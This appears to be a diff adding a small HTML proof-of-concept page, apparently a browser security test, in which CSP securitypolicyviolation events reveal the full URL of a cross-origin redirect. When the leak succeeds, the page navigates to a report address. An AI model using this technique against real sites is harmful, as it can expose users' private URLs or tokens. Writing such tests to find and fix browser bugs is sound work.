@@ -1,0 +1,32 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' vulnerabledoma.in">
+  </head>
+  <body>
+    <button id="test1">TEST 1</button>
+    <button id="test2">TEST 2</button>
+    <button id="test3">TEST 3</button>
+    <script>
+      document.addEventListener('securitypolicyviolation', e => {
+        if (e.blockedURI.includes('vulnerabledoma.in/path?query')) {
+          document.location.href = "https://a.test/report/?leak=f1542194";
+        }
+      });
+
+      document.getElementById('test1').onclick = function() {
+        document.getElementById('iframe').src = "https://vulnerabledoma.in/fx_csp_violation_leak_302.php";
+      };
+      document.getElementById('test2').onclick = function() {
+        document.getElementById('iframe').src = "https://www.vulnerabledoma.in/path?query";
+      };
+      document.getElementById('test3').onclick = function() {
+        var a = document.createElement('a');
+        a.href = "https://www.vulnerabledoma.in/path?query";
+        a.innerText = "Link to external domain";
+        document.body.appendChild(a);
+        a.click();
+      };
+    </script>
+    <iframe id="iframe"></iframe>
+  </body>
+</html>
